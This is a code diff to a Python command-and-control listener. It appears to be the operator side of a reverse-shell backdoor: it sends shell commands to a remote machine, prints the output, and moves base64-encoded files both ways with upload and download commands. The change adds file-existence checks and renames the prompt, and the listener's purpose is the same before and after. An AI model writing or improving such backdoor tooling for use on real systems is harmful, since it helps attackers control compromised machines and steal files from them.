@@ -1,6 +1,7 @@
 import socket
 import json
 import base64
+import os
 
 class Listener:
     def __init__(self, ip, port):
@@ -29,19 +30,25 @@ class Listener:
         self.reliable_send(command)
         return self.reliable_receive()
 
-    def write_file(self, path, content):
-        with open(path, "wb") as file:
-            decoded_content = base64.b64decode(content)
-            file.write(decoded_content)
-        print("[+] Upload successful")
+    def write_file(self, path, content):    
+        if os.path.isfile(path):
+            with open(path, "wb") as file:
+                decoded_content = base64.b64decode(content)
+                file.write(decoded_content)
+            print("[+] Upload successful")
+        else:
+            print(f"[-] {path} does not exist")
 
     def read_file(self, path):
-        with open(path, "rb") as f:
-            return base64.b64encode(f.read()).decode()
+        if os.path.isfile(path):
+            with open(path, "rb") as f:
+                return base64.b64encode(f.read()).decode()
+        else:
+            print(f"[-] {path} does not exist")
 
     def run(self):
         while True:
-            command = input(">:) ")
+            command = input("> ")
             try:
                 if command == "exit":
                     break
@@ -57,8 +64,9 @@ class Listener:
                 elif command.split()[0] == "upload":
                     file_path = command.split()[1]
                     file_content = self.read_file(file_path)
-                    result = self.execute_remotely(command + " " + file_content)
-                    print(result)
+                    if file_content != None:
+                        result = self.execute_remotely(command + " " + file_content)
+                        print(result)
                 else:
                     result = self.execute_remotely(command)
                     print(result)
